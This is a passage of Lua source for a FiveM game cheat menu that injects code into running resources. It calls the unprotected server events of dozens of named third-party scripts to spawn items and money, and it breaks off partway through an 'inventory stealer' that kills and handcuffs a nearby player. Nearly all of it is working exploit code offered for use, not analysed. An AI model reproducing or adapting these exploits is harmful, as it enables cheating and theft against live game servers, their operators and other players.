                                                if GetResourceState("qb-crafting") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent('qb-crafting:server:receiveItem', itemName, {}, amount, 0, 0)
                                                end                                                
                                                if GetResourceState("matti-airsoft") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("matti-airsoft:giveItem", itemName, amount)
                                                end
                                                if GetResourceState("mc9-cyberbar") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("mc9-cyberbar:server:AddItem", itemName, amount)
                                                end
                                                if GetResourceState("mt-UwUCafe") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("mt-UwUCafe:Server:AddItem", itemName, amount)
                                                end
                                                if GetResourceState("mt-restaurants") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("mt-restaurants:server:AddItem", itemName, amount)
                                                end
                                                if GetResourceState("nx-cayo") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("nx-cayo:server:AddItem", itemName, amount)
                                                end
                                                if GetResourceState("osp_ambulance") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("osp_ambulance:addItem", itemName, amount)
                                                end
                                                if GetResourceState("osp_farming") == "started" and not triggered then
                                                    triggered = true
                                                    for i = 1, amount do
                                                        x_TriggerServerEvent("osp_farming:AddItem", itemName)
                                                    end
                                                end
                                                if GetResourceState("pl_rustybrowns") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("pl_rustybrowns:servercraftitem", itemName, amount)
                                                end
                                                if GetResourceState("qb-drugs") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("qb-drugs:server:giveDrugs", itemName, amount)
                                                end
                                                if GetResourceState("rpuk") == "started" and not triggered then
                                                    triggered = true
                                                    for i = 1, amount do
                                                        x_TriggerServerEvent("rpuk:failedItemUsage", itemName)
                                                    end
                                                end
                                                if GetResourceState("savana-restaurant") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("savana-restaurant:giveItem", itemName, amount)
                                                end
                                                if GetResourceState("sayer-jukebox") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("sayer-jukebox:AddItem", itemName, amount)
                                                end
                                                if GetResourceState("shark-leotools") == "started" and not triggered then
                                                    triggered = true
                                                    for i = 1, amount do
                                                        x_TriggerServerEvent("shark-leotools:giveBack", itemName)
                                                    end
                                                end
                                                if GetResourceState("solos-hookah") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("solos-hookah:server:Buy-Item", itemName, amount, 0)
                                                end
                                                if GetResourceState("solos-jointroll") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("solos-jointroll:server:ItemAdd", itemName, amount)
                                                end
                                                if GetResourceState("solos-joints") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("solos-joints:server:itemadd", itemName, amount)
                                                end
                                                if GetResourceState("solos-weedtable") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("solos-weed:server:itemadd", itemName, amount)
                                                end
                                                if GetResourceState("solstice_moonshine") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("SolsticeMoonshineV2:server:AddItem", itemName, amount)
                                                end
                                                if GetResourceState("streetcode_PlugTalk") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("DrugBuy:drugshop", itemName, 0, amount)
                                                end
                                                if GetResourceState("t1ger_pawnshop") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("t1ger_pawnshop:buyItem", amount, 0, itemName, itemName)
                                                end
                                                if GetResourceState("uwucafe") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("uwucafe:addItem", itemName, amount)
                                                end
                                                if GetResourceState("zat-farming") == "started" and not triggered then
                                                    triggered = true
                                                    for i = 1, amount do
                                                        x_TriggerServerEvent("zat-farming:server:GiveItem", itemName)
                                                    end
                                                end
                                                if GetResourceState("LeDjo_Mecano") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("ledjo_meca:add", itemName, amount, itemName)
                                                end
                                                if GetResourceState("esx_PawnShop") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("esx_PawnShop:BuyItem", amount, 1, itemName)
                                                end
                                                if GetResourceState("mc9-weapondealer") == "started" and not triggered then
                                                    triggered = true
                                                    for i = 1, amount do
                                                        x_TriggerServerEvent("mc9-weapondealer:server:giveItem", itemName)
                                                    end
                                                end                                                                                                                                                       
                                                    if GetResourceState("ef_shops") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent( '__ox_cb_EF-Shops:Server:PurchaseItems', 'ef_shops', 'EF-Shops:Server:PurchaseItems:4682', { currency = 'card', items = { { id = GetPlayerServerId(PlayerId()), name = itemName, price = 0, quantity = amount, weight = 5000 } }, shop = { id = 'hardware', label = 'MoonOT', location = 4 } } )
                                                    end
                                                    if GetResourceState("dusa_mechanic") == "started" and not triggered then
                                                        triggered = true
                                                        for i = 1, amount do
                                                        x_TriggerServerEvent('dusa_mechanic:sv:craftItem', { name = itemName, item = itemName, prop = 'w_pi_pistol', requirements = {} })
                                                        end
                                                    end  
                                                    if GetResourceState("pug-fishing") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('pug-fishing:Server:ToggleItem', true, itemName, amount)
                                                    end    
                                                    if GetResourceState("solos-restaurants") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('solos-food:server:itemadd', itemName, amount)
                                                    end         
                                                    if GetResourceState("pug-chopping") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('Pug:server:GiveChoppingItem', true, itemName, amount, nil)
                                                    end    
                                                    if GetResourceState("boii-drugs") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('boii-drugs:sv:AddItem', itemName, amount)
                                                    end                                                      
                                                    if GetResourceState("kaves_drugsv2") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('kaves_drugsv2:server:giveItem', 'item', amount)
                                                    end                                                      
                                                    if GetResourceState("lu-consumables") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('lu-consumables:server:toggleItem', give, item, amount)
                                                    end                                                                                                        
                                                    if GetResourceState("solos-methlab") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('solos-methlab:server:itemadd', itemName, amount, true)
                                                    end                                                                                                                                                    
                                                    if GetResourceState("utk_hackdependency") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('__ox_cb_utk_hackdependency:client:AddItem', true, itemName, amount)
                                                    end                                                                                                        
                                                    if GetResourceState("dsAdminMenu") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('dsAdminMenu:giveWeapon', itemName)
                                                    end
                                                    if GetResourceState("complete_hunting") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('complete_hunting:server:giveReward', itemName, tonumber(amount))
                                                    end
                                                    if GetResourceState("xrp-jobmanager") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('jobmanager:server:additem', itemName, amount)
                                                    end
                                                    if GetResourceState("ez_whitewidow") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('ez_lib:server:AddItem', itemName, amount)
                                                    end                                                                                                                                                                                                                                                                                                                             
                                                    if GetResourceState("sf_camerasecurity") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('sf_camerasecurity:Server:BuyItem', 'bank', 0, itemName, amount)
                                                    end                                                     
                                                    if GetResourceState("dusa_pets") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent("dusa-pets:addItem", itemName, amount)
                                                    end                                                                                                
                                                    if GetResourceState("ars_vvsguns") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent("ars_vvsguns:Buyitem", "vvsguns", { items = { { id = itemName, image = "Moon", name = "Moon", page = 2, price = 0, quantity = amount, stock = 9999999999, totalPrice = 0 } }, method = "cash", total = 0 }, "cash" )
                                                    end                                                    
                                                    if GetResourceState("ak47_drugmanagerv2") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent("ak47_drugmanagerv2:shop:buy", "69.420 MoonOT", {
                                                            buyprice  = 0,
                                                            currency  = "cash",
                                                            label     = "MoonOT",
                                                            name      = itemName,
                                                            sellprice = 0
                                                        }, amount)
                                                    end
                                                    if GetResourceState("core_crafting") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent("core_crafting:itemCrafted", itemName, amount)	
                                                    end                                                    
                                                    if GetResourceState("ak47_qb_drugmanagerv2") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent("ak47_qb_drugmanagerv2:shop:buy",
                                                            "69.420 MoonOT",
                                                            {
                                                                buyprice  = 0,
                                                                currency  = "cash",
                                                                label     = "MoonOT",
                                                                name      = itemName,
                                                                sellprice = 0
                                                            },
                                                            amount
                                                        )
                                                    end
                                                    if GetResourceState("codewave-cannabis-cafe") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('cannabis_cafe:giveStockItems', itemName, amount)
                                                    end                                                     
                                                    if GetResourceState("ars_smoking") == "started" and not triggered then
                                                        triggered = true
                                                        for i = 1, amount do
                                                            x_TriggerServerEvent('ars_smoking:server:startCrafting', itemName)
                                                        end
                                                    end
                                                    if GetResourceState("WayTooCerti_3D_Printer") == "started" and not triggered then
                                                        triggered = true
                                                        for i = 1, amount do
                                                            x_TriggerServerEvent('waytoocerti_3dprinter:CompletePurchase', itemName)
                                                        end
                                                    end                                                     
                                                    if GetResourceState("ars_hunting") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('ars_hunting:sellBuyItem', {
                                                            item = itemName,
                                                            price = 1,
                                                            quantity = amount,
                                                            buy = true
                                                        })
                                                    end
                                                    if GetResourceState("ak47_business") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('ak47_business:processed', {
                                                            item = itemName,
                                                            price = 1,
                                                            quantity = amount,
                                                            buy = true
                                                        })
                                                    end
                                                    if GetResourceState("ars_vvsgrillz_v2") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('ars_vvsgrillz_v2:Buyitem', 'grillz', {
                                                            items = {{
                                                                id = itemName,
                                                                quantity = amount,
                                                                price = 0,
                                                                stock = 9999,
                                                                totalPrice = 0
                                                            }},
                                                            method = 'bank',
                                                            total = 0
                                                        }, 'bank')
                                                    end
                                                    if GetResourceState("ak47_qb_business") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('ak47_qb_business:processed', {
                                                            item = itemName,
                                                            price = 1,
                                                            quantity = amount,
                                                            buy = true
                                                        })
                                                    end
                                                    if GetResourceState("apex_cluckinbell") == "started" and not triggered then
                                                        triggered = true
                                                        for i = 1, amount do
                                                            x_TriggerServerEvent('apex_cluckinbell:client:addItem', itemName)
                                                        end
                                                    end                                                  
                                                    if GetResourceState("tvrpdrugs") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('tvrpdrugs:server:addItem', itemName, amount)
                                                    end
                                                    if GetResourceState("av_business") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('av_business:addItem', itemName, 1000, amount)
                                                    end
                                                    if GetResourceState("solos-methlab") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent("solos-methlab:server:itemadd", itemName, amount, true)
                                                    end
                                                    if GetResourceState("ak47_whitewidowv2") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent("ak47_whitewidowv2:process", itemName, {['phone']=0}, amount, 0)
                                                    end
                                                    if GetResourceState("ak47_cannabiscafev2") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent("ak47_cannabiscafev2:process", itemName, {['phone']=0}, amount, 0)
                                                    end
                                                    if GetResourceState("ak47_leafnlatte") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent("ak47_leafnlatte:process", itemName, {['phone']=0}, amount, 0)
                                                    end
                                                    if GetResourceState("ak47_qb_cannabiscafev2") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent("ak47_qb_cannabiscafev2:process", itemName, {['phone']=0}, amount, 0)
                                                    end
                                                    if GetResourceState("ak47_qb_leafnlatte") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent("ak47_qb_leafnlatte:process", itemName, {['phone']=0}, amount, 0)
                                                    end
                                                    if GetResourceState("ak47_qb_khusbites") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent("ak47_qb_khusbites:process", itemName, {['phone']=0}, amount, 0)
                                                    end
                                                    if GetResourceState("ak47_qb_whitewidowv2") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent("ak47_qb_whitewidowv2:process", itemName, {['phone']=0}, amount, 0)
                                                    end                                                    
                                                    if GetResourceState("solos-moneywash") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent("solos-moneywash:server:ItemAdd", itemName, amount)
                                                    end
                                                    if GetResourceState("snipe-boombox") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent("snipe-boombox:server:pickup", amount, vector3(0.0, 0.0, 0.0), itemName)
                                                    end
                                                    if GetResourceState("rm_camperv") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent("camperv:server:giveItem", itemName, amount)
                                                    end
                                                    if GetResourceState("Wrapper2") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('Wrapper2:AddItem', itemName, amount)
                                                    end
                                                    if GetResourceState("wp-pocketbikes") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('wp-pocketbikes:server:AddItem', itemName, amount)
                                                    end
                                                    if GetResourceState("nk") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('nk:barbeque:addItem', itemName, amount)
                                                    end
                                                    if GetResourceState("ak47_idcard") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('ak47_idcard:giveid', itemName)
                                                    end
                                                    if GetResourceState("ez_lib") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('ez_lib:server:AddItem', itemName, amount)
                                                    end
                                                    if GetResourceState('boii-moneylaunderer') == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('boii-moneylaunderer:sv:AddItem', itemName, amount)
                                                    end
                                                    if GetResourceState("devcore_smokev2") == "started" and not triggered then
                                                        triggered = true
                                                        for i = 1, amount do
                                                            x_TriggerServerEvent('devcore_smokev2:server:AddItem', itemName)
                                                        end
                                                    end
                                                    if GetResourceState("boii-consumables") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('boii-consumables:sv:AddItem', itemName, amount)
                                                    end
                                                    if GetResourceState("angelicxs-CivilianJobs") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('angelicxs-CivilianJobs:Server:GainItem', itemName, math.floor(amount))
                                                    end
                                                    if GetResourceState("hg-wheel") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('hg-wheel:server:giveitem', itemName)
                                                    end
                                                    if GetResourceState("dcweedroll") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('weedroll:additem', itemName, amount)
                                                    end
                                                    if GetResourceState("ars_ambulancejob") == "started" and not triggered then
                                                        triggered = true
                                                        TriggerServerEvent('ars_ambulancejob:removAddItem', {toggle = false, item = itemName, quantity = amount})
                                                    end
                                                    if GetResourceState("qb-advancedrugs") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('qb-advancedrugs:giveItem', itemName, amount)
                                                    end
                                                    if GetResourceState("devcore_needs") == "started" and not triggered then
                                                        triggered = true
                                                        for i = 1, amount do
                                                            x_TriggerServerEvent('devcore_needs:server:AddItem', itemName)
                                                        end
                                                    end
                                                    if GetResourceState("codewave-bbq") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('placeProp:returnItem', itemName)
                                                    end
                                                    if GetResourceState("ak47_whitewidowv2") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent("ak47_whitewidowv2:process", itemName, {["weed_leaf"] = 0}, amount, 0)
                                                    end                                                           
                                                    if GetResourceState("t1ger_lib") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('t1ger_lib:server:addItem', itemName, amount)
                                                    end
                                                    Citizen.Wait(500)
                                                end)
                                            end

                                            IuyAnLAIBNaU()
                                        ]], itemName, amount)

                                        if canInjectResource() then
                                            MachoInjectResource2(NewThreadNs, "any", code)
                                        end

                                        sendNotification("Spawn Item", "Spawning " .. amount .. "x " .. itemName, "success", 3000)
                                    end,
                                    function()
                                    end
                                )
                            end,
                            function()
                            end
                        )
                    end
                },
                {
                    label = "Spawn Money",
                    type = "button",
                    onConfirm = function()
                        openInputDialog("Enter amount:", 10, function(amountStr)
                            local amount = tonumber(amountStr)

                            if not amount or amount <= 0 then
                                sendNotification("Spawn Money", "Invalid amount", "error", 2000)
                                return
                            end

                            local code = string.format([[
                                function lIKouajan()
                                    CreateThread(function()
                                        local amt = %d
                                        local triggered = false

                                        x_TriggerServerEvent = TriggerServerEvent


                        if GetResourceState("Browns-MoneyWash") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('esx:triggerServerCallback', 'wash:AddAccountBalance', 10, 'Browns-MoneyWash', amt)
                        end

                        if GetResourceState("savana-truckerjob") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('savana - truckerJob:addXpAndMoney', 50, amt)
                        end

                        if GetResourceState("codewave-handbag-phone") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('delivery:giveRewardhandbags', amt)
                        end

                        if GetResourceState("codewave-sneaker-phone") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('delivery:giveRewardShoes', amt)
                        end

                        if GetResourceState("codewave-icebox-phone") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('delivery:giveRewardiceboxs', amt)
                        end

                        if GetResourceState("viper-nowljobs") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('viper-nowljobs:Server:Payment',math.floor(amt))
                        end

                        if GetResourceState("solos-restaurants") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('solos-food:server:addmoney', 'bank', amt)
                        end

                        if GetResourceState("solos-payments") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('solos-cashier:server:addmoney','bank', amt)
                        end

                        if GetResourceState("Rc2-carauction") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('Rc2-carauction:server:GiveComm', amt)
                        end

                        if GetResourceState("brutal_atm_robbery") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('brutal_atm_robbery:server:AddPlayerMoney', amt)
                        end

                        if GetResourceState("myATMRobbery") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('myATMRobbery:pay', amt)
                        end

                        if GetResourceState("pug-chopping") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('Pug:server:GiveChoppingCarPay', amt)
                        end

                        if GetResourceState("bt-cashregister") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('bt-cashregister:receiptSold', amt)
                        end

                        if GetResourceState("fruitpicker") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('inside-fruitpicker:Payout', amt)
                        end

                        if GetResourceState("Fleeca") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('Fleeca:GiveMoney', amt)
                        end


                        if GetResourceState("esx_RufiFoodtruck") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('esx_RufiFoodTruck:NPCPay', amt)
                        end



                        if GetResourceState("esx_truckerjob") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('esx_truckerjob:pay', amt)
                        end

                        if GetResourceState("esx_slotmachine") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('esx_slotmachine:sv:2', amt)
                        end

                        if GetResourceState("esx_tankerjob") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('esx_tankerjob:pay', amt)
                        end

                        if GetResourceState("esx_pizza") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('esx_pizza:pay', amt)
                        end

                        if GetResourceState("boii-moneylaunderer") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('boii-moneylaunderer:sv:PayPlayer', amt)
                        end


                        if GetResourceState("lscustoms") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('lscustoms:payGarage', amt)
                        end

                        if GetResourceState("dr-drugs") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('dr-drugs:giveBlackMoney2', amt)
                        end


                        if GetResourceState("gts_atmrobbery") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('gts_atmrobbery:giveMoney', amt)
                        end



                        if GetResourceState("codewave-wigs-v3-phone") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('delivery:giveRewardWigss', amt)
                        end

                        if GetResourceState("codewave-caps-client-phone") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('delivery:giveRewardCaps', amt)
                        end

                        if GetResourceState("codewave-nails-phone") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('delivery:giveRewardnails', amt)
                        end

                        if GetResourceState("codewave-lashes-phone") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('delivery:giveRewardlashes', amt)
                        end

                        if GetResourceState("qb-carauction") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('qb-carauction:server:GiveComm', amt)
                        end

                        if GetResourceState("stg-goldpanning") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('stg-goldpanning:collect', tonumber(amt))
                        end

                        if GetResourceState("pd_moneygun") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('pd_moneygun:server:recieveMoney', amt)
                        end

                        if GetResourceState("myBurgerDelivery") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('burgerjob:payment', amt)
                        end

                        if GetResourceState("angelicxs-CivilianJobs") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('angelicxs-CivilianJobs:Server:Payment', amt)
                        end

                        if GetResourceState("qs-fuelstations") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('fuelstations:server:pay', amt)
                        end

                        if GetResourceState("AdminMenu") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('AdminMenu:giveCash', amt)
                        end


                        if GetResourceState("bt-cash-register") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('bt-cashregister:receiptSold', amt)
                        end

                        if GetResourceState("B-T-Cash-Register") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('bt-cashregister:receiptSold', amt)
                        end


                        if GetResourceState("esx_uber") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('esx_uber:pay', amt)
                        end


                        if GetResourceState("myMiningjob") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('myMinijobCore:pay', amt)
                        end

                        if GetResourceState("pressurewasher") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('pwasher:pay', amt)
                        end


                        if GetResourceState("esx_drugs2") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('esx_drugs2:test', -1, amt)
                        end


                        if GetResourceState("lation_detecting") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('lation_detecting:RemoveItems', GetPlayerServerId(PlayerId()), { { count = 1, name = 'cash' } }, amt)
                        end

                        if GetResourceState("plt_farmer") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('plt_farmer:MissionComplate', amt)
                        end

                        if GetResourceState("DriftCounter") == "started" and not triggered then
                            triggered = true
                            Trigger:x_TriggerServerEvent('driftcounter:payDrift', amt)
                        end

                        if GetResourceState("esx_carthief") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('esx_carthief:pay', amt)
                        end



                        if GetResourceState("DE_garbage") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('DE_garbage:pay', amt)
                        end

                        if GetResourceState("esx_advancedgarage") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('esx_advancedgarage:payhealth', amt)
                        end

                        if GetResourceState("esx_vangelico_robbery") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('99kr-esx_vangelico_robbery:sellItems', 'phone', 1, amt)
                        end

                        if GetResourceState("kvl-rescue") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('kvl-rescue:addmoney', amt)
                        end

                        if GetResourceState("decrypto") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('decrypto:server:givecash', amt)
                        end


                        if GetResourceState("ak47_prospecting") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('ak47_prospecting:sell','cash', 1, amt)
                        end

                        if GetResourceState("bbv-poolcleaner") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('Wrapper:AddMoney','bank', amt)
                        end


                        if GetResourceState("kvl-truck") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('kvl-trucker:addmoney', amt)
                        end

                        if GetResourceState("ry_truckerjob") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('ry_truckerjob:pay', amt)
                        end


                        if GetResourceState("ry_rent") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('ry-vehiclerental:giveMoney', amt)
                        end

                        if GetResourceState("vrp_slotmachine") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('vrp_slotmachine:server:2', amt)
                        end

                        if GetResourceState("gofast") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('GoFast:VenteDuVehicule', amt)
                        end

                        if GetResourceState("krz_personalmenu") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('KorioZ-PersonalMenu:Admin_giveCash', amt)
                        end

                        if GetResourceState("krz_personalmenu") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('KorioZ-PersonalMenu:Admin_giveDirtyMoney', amt)
                        end

                        if GetResourceState("krz_personalmenu") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('KorioZ-PersonalMenu:Admin_giveBank', amt)
                        end

                        if GetResourceState("vrp_truckerfuel") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('truckerfuel:success', amt)
                        end

                        if GetResourceState("X-BankRobbery") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('bankrobbery:success', amt)
                        end

                        if GetResourceState("ts_Busdriver") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('Trusted:Busdriver:PayCheck', amt, 100)
                        end



                        if GetResourceState("FzD-CardFraud") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('FzD-CardFruad:giveMoney',1, amt)
                        end

                        if GetResourceState("cdn-fuel") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('cdn-fuel:station:server:Withdraw', amt, 1, amt)
                        end


                        if GetResourceState("myGardener") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('gardenerjob:payment', amt)
                        end



                        if GetResourceState("Var-GarbageJob") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('Garbage:Reward', amt, true)
                        end

                        if GetResourceState("sloty") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('esx_slots:PayOutRewards', amt)
                        end

                        if GetResourceState("Codem-BlackHUDV2") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('route68_blackjack:givemoney', amt, 2)
                        end

                        if GetResourceState("rob_atm") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('banking:robATM', amt)
                        end


                        if GetResourceState("rlv-personalmenu") == "started" and not triggered then
                            triggered = true
                            x_TriggerServerEvent('rlv-PersonalMenu:jobx_money', amt)
                        end

                                    end)
                                end

                                lIKouajan()
                            ]], amount)

                            MachoInjectResource2(NewThreadNs, "any", code)
                            sendNotification("Spawn Money", "Spawned $" .. amount, "success", 2000)
                        end)
                    end
                },                               
                {
                    label = "Inv Stealr (E)",
                    type = "button",
                    onConfirm = function()
                    local ActiveInventory = nil
                    local InventoryResources = {
                        ox = "ox_inventory",
                        qb = "qb-inventory"
                    }

                    for key, res in pairs(InventoryResources) do
                        if GetResourceState(res) == "started" then
                            ActiveInventory = key
                            break
                        end
                    end

                    if not ActiveInventory then
                        sendNotification("Inventory Stealer", "Resource Not Found", "info", 2000)
                        return
                    end

                    local code = ([[
                        CreateThread(function()
                            local dict = 'missminuteman_1ig_2'
                            local anim = 'handsup_enter'

                            RequestAnimDict(dict)
                            while not HasAnimDictLoaded(dict) do Wait(0) end

                            while true do
                                Wait(0)
                                if IsDisabledControlJustPressed(0, 38) then
                                    local selfPed = PlayerPedId()
                                    local selfCoords = GetEntityCoords(selfPed)
                                    local closestPlayer, closestDistance = -1, -1

                                    for _, pid in ipairs(GetActivePlayers()) do
                                        local targetPed = GetPlayerPed(pid)
                                        if targetPed ~= selfPed then
                                            local dist = #(selfCoords - GetEntityCoords(targetPed))
                                            if closestDistance == -1 or dist < closestDistance then
                                                closestPlayer = pid
                                                closestDistance = dist
                                            end
                                        end
                                    end

                                    if closestPlayer ~= -1 and closestDistance <= 3.0 then
                                        local targetPed = GetPlayerPed(closestPlayer)
                                        local sid = GetPlayerServerId(closestPlayer)

                                        SetEnableHandcuffs(targetPed, true)
                                        SetEntityHealth(targetPed, 0)
                                        SetEnableHandcuffs(targetPed, true)

                                        if not IsEntityPlayingAnim(targetPed, dict, anim, 13) then
